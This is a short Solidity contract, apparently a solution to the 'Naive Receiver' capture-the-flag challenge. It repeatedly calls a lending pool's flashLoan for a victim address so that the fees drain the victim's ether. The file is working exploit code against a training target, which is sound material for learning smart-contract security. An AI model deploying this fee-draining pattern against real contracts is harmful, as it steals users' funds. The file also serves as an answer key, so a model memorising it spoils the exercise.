// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract Attack {
    NaiveReceiverLenderPool pool;

    constructor(address payable _addr) {
        pool = NaiveReceiverLenderPool(_addr);
    }

    function exploit(address victim) public {
        for (int i = 0; i < 10; ++i) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}
